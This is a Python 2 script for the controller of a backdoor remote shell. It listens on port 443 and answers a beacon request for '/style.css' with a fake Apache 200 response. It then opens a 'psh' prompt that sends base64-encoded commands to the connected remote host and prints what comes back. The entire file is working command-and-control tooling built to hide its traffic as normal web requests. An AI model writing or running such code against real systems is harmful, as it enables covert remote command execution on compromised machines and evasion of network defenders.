#!/usr/bin/env python

import re
import base64
import socket
import argparse
from datetime import datetime

SIZE = 1024
FAKEOK = """HTTP/1.1 200 OK\r
Date: Tue, 19 Mar 2013 22:12:25 GMT\r
Server: Apache\r
X-Powered-By: PHP/5.3.10-1ubuntu3.2\r
Content-Length: 364\r
Content-Type: text/plain\r
\r
body{background-color:#f0f0f2;margin:0;padding:0;font-family:"Open Sans","Helvetica Neue",Helvetica,Arial,sans-serif}div{width:600px;margin:5em auto;padding:50px;background-color:#fff;border-radius:1em}a:link,a:visited{color:#38488f;text-decoration:none}@media (max-width:700px){body{background-color:#fff}div{width:auto;margin:0 auto;border-radius:0;padding:1em}}"""


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port')
    return parser.parse_args()


def ctrl_shell_server(s, PORT):
    print '[+] ({}) Entering perennial shell (psh)'.format(datetime.now())
    conn, addr = s.accept()
    while True:
        try:
            inp = raw_input('psh > ')
            if inp == 'exit':
                break
            elif inp == '':
                continue
            elif inp == 'help':
                print 'commands:\n  exec'
            elif inp.startswith('exec'):
                if re.search('^exec (".+"\ )+$', inp + ' '):
                    response = ctrl_shell_exec(conn, inp)
                    print response
                else:
                    print 'usage: exec "cmd1" ["cmd2" "cmd3" ...]'
            else:
                print 'psh: {}: command not found'.format(inp)
        except KeyboardInterrupt:
            break
    conn.send(base64.b64encode('fin'))
    conn.close()
    print '[+] ({}) Exiting control shell.'.format(datetime.now())


def ctrl_shell_exec(conn, inp):
    conn.send(base64.b64encode(inp))
    stdout = conn.recv(SIZE)
    return base64.b64decode(stdout)


def main():
    args = get_args()
    PORT = int(args.port) if args.port else 443

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', PORT))
    s.listen(1)

    print '[+] Perennial server started on {}.'.format(PORT)
    conn, addr = s.accept()
    print '[i] Connected By: {} at {}'.format(addr, datetime.now())
    ping = conn.recv(SIZE)
    if ping.startswith('GET /style.css HTTP/1.1'):
        conn.send(FAKEOK)
        conn.close()
        ctrl_shell_server(s, PORT)

if __name__ == '__main__':
    main()
